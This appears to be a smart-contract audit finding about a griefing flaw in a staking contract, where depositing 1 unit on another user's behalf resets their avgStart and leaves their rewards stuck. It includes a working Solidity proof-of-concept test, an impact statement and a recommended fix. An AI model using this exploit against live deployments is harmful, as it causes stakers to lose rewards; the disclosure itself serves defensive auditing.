---
id: 25149
severity: "Medium"
---

# Attackers will reset avgStart of any user making rewards stuck for longer and get lost to savings

## Description



## Proof of Concept

Add the following test to `StakedEXA.t.sol`.

```solidity
function test_POC_anyone_can_reset_stakedTime() external {
  bool attack = true;
  uint256 assets = 1e18;
  uint256 time = refTime;

  exa.mint(address(this), assets);
  stEXA.deposit(assets, address(this));

  uint256 initTime = block.timestamp * 1e18;
  skip(time + 1);
  uint256 finalTime = block.timestamp * 1e18;

  stEXA.claim(rA);
  assertEq(stEXA.avgStart(address(this)), initTime);

  // Add some more rewards
  rA.mint(address(stEXA), initialAmount);
  stEXA.notifyRewardAmount(rA, initialAmount);

  // Attacker deposits 1 to reset start time and get rewards stuck
  if (attack) {
    address attacker = makeAddr("attacker");
    exa.mint(attacker, 1);
    vm.startPrank(attacker);
    exa.approve(address(stEXA), 1);
    stEXA.deposit(1, address(this));
    vm.stopPrank();
    assets += 1;
  }

  skip(minTime);

  assertEq(stEXA.avgStart(address(this)), attack ? finalTime : initTime, "avgStart");
  assertEq(stEXA.claimable(rA, address(this), assets), attack ? 0 : 20833334711198888308, "claimable");
}
```

## Impact

User will not receive any rewards until `minTime` and will lose to savings when withdrawing as no rewards would have vested due to `avgStart[to]` having been reset.

## Recommendation

Remove the `avgStart[to]` reset mechanism in `_update()`, as users can decrease their staked time by withdrawing and depositing again, it should not be able to reset like this because they might want to just keep claiming or withdraw in the near future while paying only some `excessFactor` rewards. With the code as is, attackers can manipulate other users rewards and make them lose funds.
